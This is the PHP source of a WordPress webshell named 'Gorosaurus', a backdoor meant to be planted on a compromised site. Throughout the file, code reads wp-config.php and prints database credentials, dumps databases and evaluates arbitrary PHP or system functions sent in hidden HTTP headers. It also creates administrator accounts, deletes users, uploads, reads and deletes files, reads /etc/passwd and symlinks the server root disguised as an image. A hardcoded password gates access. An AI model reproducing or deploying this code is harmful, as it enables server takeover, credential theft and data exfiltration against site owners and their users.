<?php
error_reporting(0);
/*
	-={Gorosaurus v0.1: WordPress Webshell}=-

	-Locate and read WP-CONFIG
	-Load wp-config.php (enable direct usage of credentials)
	-General WordPress info (files writeables, admins, plugins installed , etc.)
	-Knock out security plugins //TODO
	-Add admin account 
	-Backdoor FTP // TODO
	-Activate / Deactivate plugins //TODO
	-Delete user

	

	-Read db credentials (if is a WordPress)
	-Dump WordPress database (shortcut)
	-Show all database names 
	-Show tables and columns from a given database 
	-Dump databases 
	-Read a file using load_file //TODO


	-Password Protected using HTTP headers
	-Commands are sent by unique HTTP headers
	-Self-destruction //TODO

	-Server info
	-Functions allowed 
	-Eval PHP code 
	-Execute commands directly as in a terminal-like way (it needs system, passthru or other similar function)
	-List all domains in the server 
	-List all users in the server 
	-Detect CMS installed in others domains //TODO

	-Browse between directories
	-List files/directories
	-Show source of files 
	-Download/upload files 
	-Delete files 
	
	-Symlinking 



*/



?>

<?php

// FUNCTIONS

function find_file($file) {
	/* $file is a file to look for ("wp-config.php" for example).
	   This function returns a string with the path where is located the file.
	   If function fails, return "-1".
	*/
	$found = FALSE;
	$start = $file;
	$count = 0;
	$path = "";
	while ($found === FALSE) {
		$path = "../".$path;
		$test = $path.$start;
		if (strlen($test) > 256) { return -1; }
		if (file_exists($test)) {
			$found = TRUE;
		} 
		$count++;
	}
	return $test;
}

function read_wp_config() {
	/* 
	   Returns: string with the source.
	*/
	$wp_config = find_file("wp-config.php");
	if ($wp_config === -1) {
		return -1; 
	} else {
		$source = file_get_contents($wp_config);
		return $source;
	}
}

function load_wp_config() {
	/* include wp-config.php. This allow us to use the credentials directly */
	$wp_config = find_file("wp-config.php");
	if ($wp_config === -1) {
		return -1; 
	} else {
		require($wp_config);
		return 1;
	}
}

function read_db_data() {
	/* $wp_config is wp-config.php source
	   Returns an array containing user, password, host and db name
	*/
	@$data = array (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, DB_PREFIX);
	return $data;
}


function dump($db) { //Extracted from Stack Overflow
	$link = mysql_connect(DB_HOST,DB_USER,DB_PASSWORD);
	mysql_select_db($db,$link);
	
	//get all of the tables
	$tables = array();
	$result = mysql_query('SHOW TABLES');
	while($row = mysql_fetch_row($result))
	{
		$tables[] = $row[0];
	}

	//cycle through
	foreach($tables as $table)
	{
		$result = mysql_query('SELECT * FROM '.$table);
		$num_fields = mysql_num_fields($result);
		
		$return.= 'DROP TABLE '.$table.';';
		$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
		$return.= "\n\n".$row2[1].";\n\n";
		
		for ($i = 0; $i < $num_fields; $i++) 
		{
			while($row = mysql_fetch_row($result))
			{
				$return.= 'INSERT INTO '.$table.' VALUES(';
				for($j=0; $j<$num_fields; $j++) 
				{
					$row[$j] = addslashes($row[$j]);
					$row[$j] = ereg_replace("\n","\\n",$row[$j]);
					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
					if ($j<($num_fields-1)) { $return.= ','; }
				}
				$return.= ");\n";
			}
		}
		$return.="\n\n\n";
	}
	echo $return; 
}


function is_this_allowed($functions) {
	/* $functions is an array that contains a list of functions
	   We return an array with the allowed functions
	*/

	$allowed = array();
	foreach ($functions as $function){
		if (function_exists($function)) { $allowed[] = $function; }
	} 
	if (count($allowed) === 0) { return -1; } else { return $allowed; }	
}

function server_info() {
	echo "[+] Dominio: ".$_SERVER['SERVER_NAME'];
	echo "\n[+] IP: ".$_SERVER['SERVER_ADDR'];
	echo "\n[+] OS: ". php_uname("s") . " " . php_uname("r") . " ". php_uname("m");
	echo "\n[+] Current user: " . get_current_user();
	echo "\n[+] Safe Mode: ";
	if (ini_get("safe_mode")) {
		echo "enabled";
	}else{
		echo "disabled";
	}
}

function wordpress_status() {
	echo "[+] Akismet is writable: ";
	if (is_writable(find_file("/plugins/akismet/akismet.php") === TRUE)) {
		echo "Yes";
	} else {
		echo "No";
	}
	echo "\n[+] Users with admin roles: ";
	$users = get_users ('role=administrator');
	foreach ($users as $user) {
		echo $user->display_name . ", ";
	}
	echo "\n[+] Administrator email: " . get_option('admin_email');
	echo "\n[+] Plugins installed: ";
	$plugins = get_plugins();
	foreach ($plugins as $plugin) {
		echo "\n   [+] ". $plugin['Name'] . " - " . $plugin['Version'];
	}
}
function terminal($func, $arg) {
	echo $func($arg);
}

function browser($string) {
	
	/* Get a base64 encoded string wich contains the args to execute */

	$cmd = explode("**", base64_decode($string));
	switch($cmd[0]) {
		case "pwd":
			echo "::". getcwd() ."::";
			break;
		case "ls":
			list_all($cmd[1]);
			break;
		case "cat":
			cat_source($cmd[1]);
			break;
		case "upload":
			upload_file($cmd[1], @$_POST['upload']);
			break;
		case "delete":
			del_file($cmd[1]);
			break;
	}
}

function list_all($path) {
	$dir = opendir($path);
	while($it = readdir($dir)) {
		if(is_dir($path."/".$it)) {
			echo "[DIR]  ". perms($path."/".$it) . "  ". $it ."\n";
		} else {
			echo "[FILE] ". perms($path."/".$it) . "  ". $it ."\n";
		}		
	}
}

function cat_source($file) {
	$source = file_get_contents($file);
	echo "\n\n". $source ."\n\n";
}

function upload_file($file,$source) {
	$file = fopen($file, "w");
	fwrite($file, base64_decode($source));
}

function del_file($file) {
	unlink($file);
}

function add_admin($username, $pass) {
	$user_id = wp_create_user($username, $pass);
	$user = new WP_User($user_id);
	$user->set_role('administrator');
}

function del_user($login) {
	$user = get_user_by('login', $login);
	$id = $user->ID;
	wp_delete_user($id);
}
function perms ($file) { //extracted from PHP.NET
$permisos = fileperms($file);
if (($permisos & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($permisos & 0xA000) == 0xA000) {
    // Enlace Simbólico
    $info = 'l';
} elseif (($permisos & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($permisos & 0x6000) == 0x6000) {
    // Especial Bloque
    $info = 'b';
} elseif (($permisos & 0x4000) == 0x4000) {
    // Directorio
    $info = 'd';
} elseif (($permisos & 0x2000) == 0x2000) {
    // Especial Carácter
    $info = 'c';
} elseif (($permisos & 0x1000) == 0x1000) {
    // Tubería FIFO
    $info = 'p';
} else {
    // Desconocido
    $info = 'u';
}

// Propietario
$info .= (($permisos & 0x0100) ? 'r' : '-');
$info .= (($permisos & 0x0080) ? 'w' : '-');
$info .= (($permisos & 0x0040) ?
            (($permisos & 0x0800) ? 's' : 'x' ) :
            (($permisos & 0x0800) ? 'S' : '-'));

// Grupo
$info .= (($permisos & 0x0020) ? 'r' : '-');
$info .= (($permisos & 0x0010) ? 'w' : '-');
$info .= (($permisos & 0x0008) ?
            (($permisos & 0x0400) ? 's' : 'x' ) :
            (($permisos & 0x0400) ? 'S' : '-'));

// Mundo
$info .= (($permisos & 0x0004) ? 'r' : '-');
$info .= (($permisos & 0x0002) ? 'w' : '-');
$info .= (($permisos & 0x0001) ?
            (($permisos & 0x0200) ? 't' : 'x' ) :
            (($permisos & 0x0200) ? 'T' : '-'));
return $info;
}

function sql_query($query, $db) {
	/*Recibe como parámetro la query y el elemento del array que debemos de mostrar 
	  Devuelve un array con todos los elementos
	*/
	
	$link = mysql_connect(DB_HOST,DB_USER,DB_PASSWORD);
	mysql_select_db($db,$link);
	$data = array();
	$result = mysql_query($query);
	while($row = mysql_fetch_row($result))
	{
		$data[] = $row[0];
	}
	return $data;
}

function sym_link() {
	@mkdir("img");
	$check_sym = @symlink("/","img/banner.jpg");
	if ($check_sym === TRUE) {
		echo "YES";
	} else {
		echo "NO";
	}
}

function server_users() {
	$users = @file("/etc/passwd");
	$users_clean = array();
	if ($users !== FALSE) {
		for ($i = 0; $i < count($users); $i++) {
			$ask = explode(":", $users[$i]);
			$users_clean[] = $ask[0];
		} 
		echo implode("\n", $users_clean);
	} else {
		echo "ERROR-DA_FCK";
	}
}

function domain_list() {
	$dfile = @file_get_contents("/etc/named.conf");
	if ($dfile !== FALSE) {
		preg_match_all('/.*?zone "(.*?)"/', $dfile, $domains);
		echo implode("\n", $domains);
	} else { echo "ER#OR"; }
}

function process_headers() {

	/* Process HTTP Request Headers from client */

	$headers = getallheaders();
	$pass_head = "XXX"; //Edit
	$exe_head = "YYY";  //Edit
	$sql = "ZZZ";	    //Edit
	if (check_pass($headers[$pass_head]) === 1) {
		set_sql_cred($headers[$sql]);
		$commands = explode("**",$headers[$exe_head]);
		switch(base64_decode($commands[0])) {
			case "ping":
				ping();
				break;
			case "db_cred":
				$db_cred = read_db_data();
				print "[+] DB_NAME: ".$db_cred[0]."\n[+] DB_USER: ".$db_cred[1]."\n[+] DB_PASSWORD: ".$db_cred[2]."\n[+] DB_HOST: ".$db_cred[3]."\n[+] TABLE PREFIX: ".$db_cred[4];
				break;
			case "db_wpdump":
				dump(DB_NAME);
				break;
			case "db_dump":
				dump(base64_decode($commands[1]));
				break;
			case "db_list_databases":
				$db_names = sql_query("select schema_name from information_schema.schemata", DB_NAME);
				foreach ($db_names as $db_name) {
					echo "\n[+] ". $db_name;
				}
				break;
			case "db_list_tables":
				$table_names = sql_query("select table_name from information_schema.tables where table_schema = '". base64_decode($commands[1])."'", DB_NAME);
				foreach ($table_names as $table_name) {
					echo "\n[+] ". $table_name;
				}
				break;
			case "db_list_columns":
				$table_names = sql_query("select column_name from information_schema.columns where table_schema = '". base64_decode($commands[1])."' and table_name = '". base64_decode($commands[2])."'", DB_NAME);
				foreach ($table_names as $table_name) {
					echo "\n[+] ". $table_name;
				}
				break;
			case "server_info":
				server_info();
				break;
			case "allowed":
				$check = is_this_allowed(explode(",",base64_decode($commands[1])));
				if ( $check === -1) {
					echo "[-] All functions are not allowed!";
				} else {
					echo "[+] Allowed: ". implode(",", $check);
				}
				break;
			case "eval_code":
				eval(base64_decode($commands[1]));
				break;
			case "terminal":
				terminal(base64_decode($commands[1]), base64_decode($commands[2]));
				break;
			case "browse":
				browser($commands[1]);
				break;
			case "wp_status":
				wordpress_status();
				break;
			case "wp_addadmin":
				add_admin(base64_decode($commands[1]), base64_encode($commands[2]));
				break;
			case "wp_delete_user":
				del_user(base64_decode($commands[1]));
			case "symlink":
				sym_link();
			case "server_users":
				server_users();
			case "domain_list":
				domain_list();
		}
	}
	
}

function check_pass($pass) {
	$original = "cartilaginoso";
	if ($pass !== $original) {
		return -1;
	} else {
		return 1;
	}
}

function ping() {
	/* Are we alive? */
	echo "alive";
}

function set_sql_cred($raw) {
	if (base64_decode($raw) !== "NO" and defined('DB_USER') !== TRUE) {
		$cred = explode("**", base64_decode($raw));
		define('DB_USER',$cred[0]);
		define('DB_PASSWORD',$cred[1]);
		define('DB_NAME', $cred[2]);
		define('DB_HOST', $cred[3]);
	}
}
?>
<?php

//Load wp core files
load_wp_config();
require(find_file("wp-load.php"));
require(find_file("wp-admin/includes/plugin.php"));
require(find_file('wp-includes/registration.php'));
require(find_file('wp-admin/includes/user.php'));
define('DB_PREFIX', @$table_prefix);


process_headers();






?>
